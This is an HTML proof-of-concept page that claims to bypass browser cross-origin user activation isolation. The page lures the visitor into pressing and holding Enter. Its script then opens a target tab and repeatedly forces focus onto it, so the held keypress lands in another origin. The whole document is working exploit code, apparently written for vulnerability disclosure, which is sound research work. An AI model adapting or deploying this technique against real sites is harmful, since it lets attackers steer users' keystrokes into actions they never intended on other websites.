<!DOCTYPE html>
<html>
<body style="background: #fff5f5; font-family: sans-serif; text-align: center; padding: 50px;">

    <h1>Bypass of Cross-Origin User Activation Isolation</h1>
    
    <button id="pre-focus-btn" style="padding: 10px 20px; font-size: 16px; margin-bottom: 10px; cursor: pointer; background: #444; color: white; border: none; border-radius: 4px;">
        1. Click 2x Here
    </button>

    <br>

    <button id="enter-btn" style="padding: 20px 40px; font-size: 20px; margin-bottom: 20px; cursor: pointer; background: #ff4444; color: white; border: none; border-radius: 8px; font-weight: bold;">
        2. Press & HOLD "Enter" Key Here
    </button>

    <div style="border: 2px dashed #ff4444; padding: 20px; background: white; max-width: 500px; margin: 0 auto;">
        <p><b>Instructions:</b></p>
        <p>1. Double click the dark button.</p>
        <p>2. Hover/Click the red button, then <b>Press & HOLD Enter</b>.</p>
        <p>3. Keep holding while the target tab opens and focus returns here.</p>
    </div>

    <script>
        const targetURL = "https://cape-poc.vercel.app/";
        let opened = false;
        let victim = null;
        document.getElementById('pre-focus-btn').addEventListener('dblclick', () => {
            console.log("[*] Button double-clicked. Interaction primed.");
            window.focus();
        });

        document.addEventListener("keydown", (event) => {
            if (event.key !== "Enter") return;
            if (event.repeat || opened) return;

            opened = true;
            console.log("[*] Keydown detected. Opening target...");
            victim = window.open(targetURL, "_blank");
            const focusInterval = setInterval(() => {
                if (!victim || victim.closed) {
                    clearInterval(focusInterval);
                    opened = false;
                    return;
                }

                try {
                    victim.focus();
                } catch (e) { }
            }, 100);
        });
    </script>
</body>
</html>
